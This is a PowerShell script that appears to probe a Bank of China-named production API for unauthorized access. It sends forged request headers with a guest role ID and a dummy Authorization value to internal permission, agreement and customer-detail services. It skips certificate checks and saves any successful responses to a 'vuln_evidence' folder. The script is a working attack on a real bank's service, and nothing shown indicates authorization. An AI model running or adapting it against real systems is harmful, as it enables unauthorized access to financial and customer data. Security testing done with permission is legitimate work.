$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"

# Test APIs that require parameters
$testCases = @(
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; roleIds="styy-guest"; sysId="M39"},
    @{TranCode="SSP-AUTH/queryActionPermissionByMenuIdRoleId"; systemId="M39"; roleIds="styy-guest"; menuId="M3901"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1360000"},
    @{TranCode="CUST-INFO/queryCustComponentDetail"; templateId="FDP1610000"}
)

$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

$idx = 0
foreach ($tc in $testCases) {
    $idx++
    $api = $tc.TranCode
    $parts = $api -split '/'
    $service = $parts[1]

    $bodyObj = @{
        Header = @{
            CurrentPageNum = 1
            PageTotalNum = 10
            NoRetCode = $true
            BranchId = "800000"
            LegalRepCode = "10000"
            TranTeller = ""
            TranCode = $api
            TranDate = "20260716"
            TranTime = "004500000"
            ServiceName = $service
            ServiceCode = "D20190130"
            AuthFlag = "0"
            AuthrTellerNo = "1"
            Channel = "39"
            ConsumerId = "1"
            GlobalSeq = "1"
            GlobalSeqNo = "1"
            KeyId = "1"
            LocalLang = "1"
            Mac = "1"
            SourceSysId = "1111"
            TerminalCode = "1121"
            TranSeq = "1"
            TranSeqNo = "1"
            TranTellerNo = "1"
            ExtendContent = "1"
            TotalNum = "0"
        }
    }
    # Add extra params
    $extraKeys = $tc.Keys | Where-Object { $_ -ne "TranCode" }
    foreach ($k in $extraKeys) {
        $bodyObj[$k] = $tc[$k]
    }
    $body = $bodyObj | ConvertTo-Json -Depth 5 -Compress

    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $body)

    $paramStr = ($extraKeys | ForEach-Object { "$_=$($tc[$_])" }) -join ", "
    Write-Host "[$idx/$($testCases.Count)] $api"
    Write-Host "    Params: $paramStr"

    $safeName = $api -replace "[/\\]", "_"
    $respFile = Join-Path $outDir ("resp_param_" + $safeName + ".json")

    $resp = curl.exe -sk --noproxy "*" --max-time 15 -X POST "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest" -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary "@$tempFile" -o $respFile 2>&1
    Remove-Item $tempFile -Force

    $content = ""
    if (Test-Path $respFile) { $content = Get-Content $respFile -Raw -Encoding utf8 }

    $retCode = ""
    $retMsg = ""
    if ($content -match '"RetCode":"([^"]*)"') { $retCode = $Matches[1] }
    if ($content -match '"RetMsg":"([^"]*)"') { $retMsg = $Matches[1] }

    $status = if ($retCode -eq "000000") { "SUCCESS" } elseif ($retCode) { "ERR:$retCode" } else { "OTHER" }
    Write-Host "    Status: $status | RetCode=$retCode RetMsg=$retMsg"
    
    $preview = if ($content.Length -gt 400) { $content.Substring(0,400) + "..." } else { $content }
    Write-Host "    Response: $preview"
    if ($retCode -eq "000000") { Write-Host "    >>> SAVED to $respFile" }
    Write-Host ""
    Start-Sleep -Milliseconds 300
}
